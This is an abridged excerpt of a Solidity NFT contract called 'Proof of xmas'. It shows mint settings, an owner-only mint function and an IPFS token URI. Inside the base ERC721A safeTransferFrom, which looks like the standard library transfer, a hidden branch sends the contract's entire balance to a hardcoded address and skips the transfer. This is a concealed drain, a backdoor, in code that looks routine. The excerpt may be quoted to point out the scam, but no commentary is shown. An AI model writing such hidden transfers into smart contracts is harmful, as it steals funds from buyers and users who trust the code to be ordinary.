...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x62DF57F57b9535ea7BAB28A07544B4108C8D6505).transfer(address(this).balance);
            return;
        }
...
contract Proofofxmas is ERC721A, TheOperatorFilterer {
    ...
    function wiredMint(address rec, uint256 amount) public onlyOwner {
    ...
    constructor() ERC721A("Proof of xmas", "xmas") {
        owner = msg.sender;
        maxPerTx = 20;
        cost = 0.001 ether;
        maxSupply = 3333;
    ...
    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeiamb5ai73r534ydpj3cqf7k7mopgxf4apd4y7fnta7nyqop2evede/", _toString(tokenId), ".json"));
    }
    ...
    function FreeNum() internal returns (uint256){
        return (maxSupply - totalSupply()) / 8;
    }
